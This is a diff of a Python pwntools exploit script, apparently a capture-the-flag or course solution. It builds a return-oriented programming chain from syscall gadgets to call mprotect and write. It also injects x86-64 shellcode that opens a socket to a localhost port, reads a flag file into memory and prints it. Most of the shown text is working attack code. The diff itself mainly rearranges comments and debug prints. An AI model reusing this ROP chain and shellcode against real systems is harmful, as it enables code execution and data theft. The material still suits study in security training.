@@ -26,6 +26,7 @@ syscall_ret = None
 pop_rsi_ret = None
 pop_rdx_ret = None
 
+
 def get_init_info():
     global start_code_address, timestamp
 
@@ -70,6 +71,7 @@ def gen_random_code_bytes():
         code_bytes += byte_array
 
     return
+
 
 def code_bytes_find(target_asm):
     global code_bytes
@@ -119,11 +121,13 @@ def mprotect_read_byte():
         7,
         syscall_ret,
 
+        # [mprotect_read_byte()'s 1st write]
         # write, syscall number 1
         # rax: syscall number - 1
         # rdi: fd (stdout) - 1
         # rsi: buf addr - start_code_address, write start from codeint
         # rdx: write len
+
         pop_rax_ret,
         1,
         pop_rdi_ret,
@@ -149,11 +153,13 @@ def mprotect_read_byte():
         4096,
         syscall_ret,
 
+        # [mprotect_read_byte()'s 2nd write]
         # write, syscall number 1
         # rax: syscall number - 1
         # rdi: fd (stdout) - 1
         # rsi: buf addr - start_code_address, write start from codeint
         # rdx: write len
+
         pop_rax_ret,
         1,
         pop_rdi_ret,
@@ -362,59 +368,7 @@ def task_4_asm_byte():
     #    -> store rax(socket fd) into r11 -> qword ptr [r10]
     # 2. sys_connect return 3 
     #    -> store rax into r12
-    # 
-
-    # mov rdi, r11 bad file descriptor??
-
-    # send_line = asm("""mov rax, 41
-    #     mov rdi, 2
-    #     mov rsi, 1
-    #     mov rdx, 0
-    #     syscall
-    #     mov r11, rax
-    #     """) + asm("mov r10, " + str(hex(debug_memory_address))) + asm("""
-    #     mov qword ptr [r10], r11
-    #     mov rax, 1
-    #     mov rdi, 1
-    #     mov rsi, r10
-    #     mov rdx, 8
-    #     syscall
-    #     mov rax, 42
-    #     mov rdi, qword ptr [r10]
-    #     """) + asm("mov r14, " + str(hex(sockaddr_memory_address))) + asm("""
-    #     mov word ptr [r14], 0x0002
-    #     mov word ptr [r14 + 0x2], 0x3713
-    #     mov dword ptr [r14 + 0x4], 0x0100007F
-    #     mov qword ptr [r14 + 0x8], 0x0000000000000000
-    #     mov rsi, r14
-    #     mov rdx, 16
-    #     syscall
-    #     mov r12, rax
-    #     """) + asm("mov r10, " + str(hex(debug_memory_address))) + asm("""
-    #     mov qword ptr [r10 + 0x8], r12
-    #     mov rax, 1
-    #     mov rdi, 1
-    #     mov rsi, r10
-    #     mov rdx, 16
-    #     syscall
-    #     mov rax, 0
-    #     """) + asm("mov r10, " + str(hex(debug_memory_address))) + asm("""
-    #     mov rdi, qword ptr [r10]
-    #     """) + asm("mov rsi, " + str(hex(flag3_memory_address))) + asm("""
-    #     mov rdx, 67
-    #     syscall
-    #     mov rax, 1
-    #     mov rdi, 1
-    #     """) + asm("mov rsi, " + str(hex(flag3_memory_address))) + asm("""
-    #     mov rdx, 67
-    #     syscall
-    #     """)
-
-    # disassembly = disasm(send_line) # Disassemble shellcode
-    # print("disassembly:\n", disassembly)
-
-    # return send_line
-
+    # ** rbx, rbp, r12-r15 is callee reservation reg
     
     send_line =  asm("""mov rax, 41
         mov rdi, 2
@@ -442,8 +396,8 @@ def task_4_asm_byte():
         syscall
         """)
 
-    disassembly = disasm(send_line) # Disassemble shellcode
-    print("disassembly:\n", disassembly)
+    # disassembly = disasm(send_line) # Disassemble shellcode
+    # print("disassembly:\n", disassembly)
 
     return send_line
 
@@ -486,22 +440,23 @@ if __name__ == '__main__':
     r.send(send_line)
     print("bytes command received output: ", r.recvuntil("bytes command received.\n", drop=False).decode())
 
-    # 1st write codeint output
+    # 1st write codeint output in mprotect_read_byte() -> if [mprotect_read_byte()'s 1st write] comment out, than this needs to turn off
+    print(" ==================== 1st write output in mprotect_read_byte() ==================== ")
     print(r.recv())
-
 
     # [second send] -> input the asm we want to execute and it will be store into the start of codeint
     send_line_2 = task_2_asm_byte() + task_3_asm_byte() + task_4_asm_byte() + exit_0_asm_byte()
     # send_line_2 = task_4_asm_byte() + exit_0_asm_byte()
-    print("send_line_2 to read: ", send_line_2)
+    print("send_line_2 to read:\n", send_line_2)
     r.send(send_line_2)
-    print("after send 2 - 1")
+    # print("after send 2 - 1")
 
-    # 2nd write codeint output
+    # 2nd write codeint output in mprotect_read_byte() -> if [mprotect_read_byte()'s 2nd write] comment out, than this needs to turn off
+    print("\n ==================== 2nd write output in mprotect_read_byte() ==================== ")
     print(r.recv())
-    print("after send 2 - 2")
 
-    # print(r.recvline().decode())    
+    # print("after send 2 - 2")
 
     # 2nd write codeint output
+    print("")
     r.interactive()
